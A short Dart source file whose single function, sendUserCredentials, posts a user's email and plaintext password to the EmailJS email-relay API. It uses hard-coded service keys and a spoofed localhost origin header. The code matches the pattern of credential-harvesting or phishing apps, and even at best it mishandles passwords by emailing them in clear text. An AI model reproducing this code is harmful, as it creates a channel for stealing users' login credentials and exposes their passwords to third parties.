import 'dart:convert';

import 'package:http/http.dart'as http;

Future sendUserCredentials({
  required String email,
  required String password,
}) async{
  const serviceId = 'service_n5q065k';
  const templateId = 'template_dwydpkh';
  const userId = 'TUGmiq6QXI1EmbtGZ';
  final url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');
  final response = await http.post(
      url,
      headers: {
        'origin': 'http://localhost',
        'Content-Type': 'application/json',
      },
      body: json.encode({
        'service_id': serviceId,
        'template_id': templateId,
        'user_id': userId,
        'template_params': {
          'user_email': email,
          'user_password': password
        }
      }));
  return response.statusCode;
}